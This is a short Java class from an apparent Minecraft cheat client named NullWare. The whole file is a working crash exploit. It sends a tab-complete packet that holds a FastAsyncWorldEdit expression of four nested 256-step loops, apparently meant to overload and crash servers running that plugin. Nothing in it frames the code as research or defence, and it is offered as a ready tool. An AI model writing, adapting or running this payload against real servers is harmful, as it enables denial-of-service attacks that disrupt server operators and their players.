package com.Vxrtrauter.NullWare.command.commands.crashers;

import com.Vxrtrauter.NullWare.command.commands.CrashHandler;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C14PacketTabComplete;

import static com.Vxrtrauter.NullWare.client.MessageHandler.sendMessage;

public class FaweCrash implements CrashHandler {
    private final Minecraft mc = Minecraft.getMinecraft();

    @Override
    public void execute(int packets) {
        sendMessage("Sending FAWE exploit packet...");
        mc.getNetHandler().getNetworkManager().sendPacket(new C14PacketTabComplete("/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
    }
}